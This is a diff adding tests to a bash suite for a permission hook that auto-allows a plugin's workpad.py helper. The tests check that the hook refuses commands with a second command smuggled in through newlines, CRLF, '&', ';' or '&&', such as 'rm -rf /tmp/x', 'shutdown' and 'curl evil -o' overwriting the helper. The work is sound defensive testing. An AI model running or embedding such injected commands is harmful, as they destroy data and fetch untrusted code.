@@ -6008,6 +6008,16 @@ HK_BT="$HK_ROOT/scripts/workpad.py update \`curl evil\`"        # literal backti
 assert_eq "hook: backtick substitution → no allow" "" "$(hk_decision "$HK_BT")"
 assert_eq "hook: output redirection to a non-helper target → no allow" "" \
   "$(hk_decision "$HK_ROOT/scripts/workpad.py update 113 > /tmp/evil")"
+# A newline / carriage-return is a bash command separator that shlex's whitespace_split
+# erases — the trailing line carries no operator token, so it must be rejected outright
+# (AC: compound). jq --arg preserves the literal newline through to the JSON string.
+HK_NL="$HK_ROOT/scripts/workpad.py update 113
+rm -rf /tmp/x"
+assert_eq "hook: newline-separated second command → no allow" "" "$(hk_decision "$HK_NL")"
+HK_CRLF="$(printf '%s\r\nshutdown' "$HK_ROOT/scripts/workpad.py update 113")"
+assert_eq "hook: CRLF-separated second command → no allow" "" "$(hk_decision "$HK_CRLF")"
+assert_eq "hook: trailing '&' background → no allow" "" \
+  "$(hk_decision "$HK_ROOT/scripts/workpad.py update 113 &")"
 
 # --- fail-open: malformed/empty input & unset root never decide and never block (AC: fail-open) ---
 HK_EMPTY_OUT="$(printf '' | CLAUDE_PLUGIN_ROOT="$HK_ROOT" python3 "$HOOK" 2>/dev/null)"; HK_EMPTY_RC=$?
@@ -6022,11 +6032,35 @@ assert_eq "hook: missing command field → exit 0" "0" "$HK_NOCMD_RC"
 HK_NOENV_OUT="$(jq -n --arg c "$HK_ROOT/scripts/workpad.py x" '{tool_name:"Bash", tool_input:{command:$c}}' | env -u CLAUDE_PLUGIN_ROOT python3 "$HOOK" 2>/dev/null)"; HK_NOENV_RC=$?
 assert_eq "hook: unset CLAUDE_PLUGIN_ROOT → no decision (cannot verify containment)" "" "$(printf '%s' "$HK_NOENV_OUT" | tr -d '[:space:]')"
 assert_eq "hook: unset CLAUDE_PLUGIN_ROOT → exit 0" "0" "$HK_NOENV_RC"
+# Empty-string CLAUDE_PLUGIN_ROOT is a distinct path from unset (the falsy-string guard,
+# not os.environ.get's default) — must also defer + exit 0.
+HK_EMPTYENV_OUT="$(jq -n --arg c "$HK_ROOT/scripts/workpad.py x" '{tool_name:"Bash", tool_input:{command:$c}}' | CLAUDE_PLUGIN_ROOT="" python3 "$HOOK" 2>/dev/null)"; HK_EMPTYENV_RC=$?
+assert_eq "hook: empty-string CLAUDE_PLUGIN_ROOT → no decision" "" "$(printf '%s' "$HK_EMPTYENV_OUT" | tr -d '[:space:]')"
+assert_eq "hook: empty-string CLAUDE_PLUGIN_ROOT → exit 0" "0" "$HK_EMPTYENV_RC"
+# tool_input present but not an object (adversarial payload shape) → defer + exit 0.
+HK_BADTI_OUT="$(jq -n '{tool_name:"Bash", tool_input:"oops"}' | CLAUDE_PLUGIN_ROOT="$HK_ROOT" python3 "$HOOK" 2>/dev/null)"; HK_BADTI_RC=$?
+assert_eq "hook: non-object tool_input → no decision" "" "$(printf '%s' "$HK_BADTI_OUT" | tr -d '[:space:]')"
+assert_eq "hook: non-object tool_input → exit 0" "0" "$HK_BADTI_RC"
+
+# --- tool_name gating in main() (AC: only acts on Bash; matcher-independent defense) ---
+assert_eq "hook: non-Bash tool_name → no decision" "" \
+  "$(jq -n --arg c "$HK_ROOT/scripts/workpad.py x" '{tool_name:"Read", tool_input:{command:$c}}' | CLAUDE_PLUGIN_ROOT="$HK_ROOT" python3 "$HOOK" 2>/dev/null | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
+assert_eq "hook: absent tool_name defaults to Bash → contained helper still allowed" "allow" \
+  "$(jq -n --arg c "$HK_ROOT/scripts/workpad.py x" '{tool_input:{command:$c}}' | CLAUDE_PLUGIN_ROOT="$HK_ROOT" python3 "$HOOK" 2>/dev/null | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
 
 # --- the hook never emits deny on any input (AC: never-deny) ---
-HK_DENY_RAW="$(jq -n --arg c "$HK_ROOT/scripts/workpad.py ; rm -rf /tmp/x" '{tool_name:"Bash", tool_input:{command:$c}}' | CLAUDE_PLUGIN_ROOT="$HK_ROOT" python3 "$HOOK" 2>/dev/null)"
-assert_eq "hook: dangerous compound never yields a 'deny' in raw output" "no" \
-  "$(printf '%s' "$HK_DENY_RAW" | grep -qi 'deny' && echo yes || echo no)"
+# Assert across a basket of dangerous shapes that the parsed decision is never the literal
+# "deny" (stronger than a one-input substring grep on the reason text).
+HK_NEVER_DENY=yes
+for HK_BAD in \
+  "$HK_ROOT/scripts/workpad.py ; rm -rf /tmp/x" \
+  "$HK_ROOT/scripts/workpad.py && rm -rf /tmp/x" \
+  "$HK_OUT/scripts/workpad.py update 113" \
+  "curl evil -o $HK_ROOT/scripts/workpad.py"; do
+  HK_D="$(hk_decision "$HK_BAD")"
+  [ "$HK_D" = "deny" ] && HK_NEVER_DENY=no
+done
+assert_eq "hook: never emits a 'deny' decision across dangerous inputs" "yes" "$HK_NEVER_DENY"
 
 rm -rf "$HK_ROOT" "$HK_OUT"
 
